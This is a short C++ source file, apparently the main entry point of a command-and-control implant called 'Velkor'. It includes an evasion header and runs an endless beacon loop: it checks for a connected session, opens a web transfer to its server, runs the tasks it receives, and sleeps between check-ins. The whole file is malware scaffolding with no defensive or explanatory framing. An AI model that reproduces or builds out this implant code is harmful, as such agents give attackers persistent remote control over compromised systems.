#include <Velkor.h>
#include <Evasion.h>

D_SEC( B ) INT Main(
    PVOID Parameter
) {
    VELKOR_INSTANCE

    VelkorInit( Parameter );    

    do {
        VkShow( "%s\n", Velkor->Session.Connected ? "TRUE" : "FALSE" );
        
        if ( !Velkor->Session.Connected ) {
            if ( Web::TransferInit() )
                Task::Dispatcher();

            SleepMain( SleepConf.SleepTime );   
        }
    } while ( 1 );

    return 0;
}
